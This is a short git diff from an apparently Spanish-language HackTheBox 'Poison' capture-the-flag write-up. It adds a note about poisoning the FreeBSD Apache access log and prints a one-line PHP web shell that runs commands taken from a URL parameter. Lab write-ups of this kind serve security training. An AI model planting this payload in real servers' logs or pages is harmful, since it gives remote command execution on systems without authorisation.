@@ -84,6 +84,18 @@ Buscamos "where-are-apache-file-access-logs-stored" for FreeBSD:
 /var/log/httpd-access.log
 ```
 
+![image](https://github.com/gecr07/Poison-HTB/assets/63270579/541d7930-5d5b-4966-95fb-b0b0ca1fba11)
+
+
+Podriamos embenenar el log.
+
+```
+<?php system($_GET['cmd']); ?>
+
+```
+
+
+
 
 
 
